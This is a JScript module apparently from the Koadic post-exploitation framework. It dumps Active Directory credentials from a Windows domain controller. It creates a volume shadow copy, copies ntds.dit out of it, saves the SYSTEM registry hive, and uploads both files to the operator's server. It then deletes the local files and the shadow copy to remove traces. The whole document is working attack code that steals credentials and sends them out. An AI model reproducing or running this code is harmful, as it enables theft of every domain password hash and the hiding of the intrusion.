try {
    var ntds_path = Koadic.file.getPath("~RPATH~\\~NTDSFILE~");
    var sysh_path = Koadic.file.getPath("~RPATH~\\~SYSHFILE~");

    // step 1. create and send .dit file, delete

    // todo: detect if shadow copy already available?

    var outp = Koadic.shell.exec("vssadmin create shadow /for=~DRIVE~", "~RPATH~\\~NTDSFILE~1.txt");

    var shadow = outp.split("Shadow Copy Volume Name: ")[1].split('\n')[0];
    var shadowid = outp.split("Shadow Copy ID: ")[1].split('\n')[0];

    //Koadic.shell.run("copy " + shadow + "\\windows\\ntds\\ntds.dit " + ntds_path, false);
    var unused = Koadic.shell.exec("copy " + shadow + "\\windows\\ntds\\ntds.dit " + ntds_path, "~RPATH~\\~NTDSFILE~2.txt");
    Koadic.http.upload(ntds_path, "~NTDSFILE~", ~CERTUTIL~, "~UUIDHEADER~");
    Koadic.file.deleteFile(ntds_path);

    // step 2. create, send SYSTEM hive, delete
    Koadic.shell.run("reg save HKLM\\SYSTEM " + sysh_path + " /y", false);
    Koadic.http.upload(sysh_path, "~SYSHFILE~", ~CERTUTIL~, "~UUIDHEADER~");
    Koadic.file.deleteFile(sysh_path);
    var discard = Koadic.shell.exec("vssadmin delete shadows /shadow="+shadowid+" /quiet", "~RPATH~\\"+Koadic.uuid()+".txt");

    // step 3. general complete
    Koadic.work.report("Complete");
} catch (e) {
    Koadic.work.error(e);
}

Koadic.exit();
